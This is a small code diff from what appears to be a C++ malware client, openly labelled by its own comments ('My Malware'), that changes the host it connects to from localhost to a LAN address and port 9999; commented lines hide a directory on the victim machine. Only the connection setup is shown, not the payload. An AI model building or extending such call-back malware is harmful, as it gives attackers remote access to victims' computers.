@@ -12,8 +12,8 @@ int main() {
 //    CreateDirectory("C:\\Users\\All Users\\My Malware\\files", NULL);
 //    SetFileAttributes("C:\\Users\\All Users\\My Malware\\files", FILE_ATTRIBUTE_HIDDEN);
 
-    string ip = "127.0.0.1";
-    int port = 7613;
+    string ip = "192.168.1.210";
+    int port = 9999;
 
 
     Connection *connection = new Connection(ip, port);
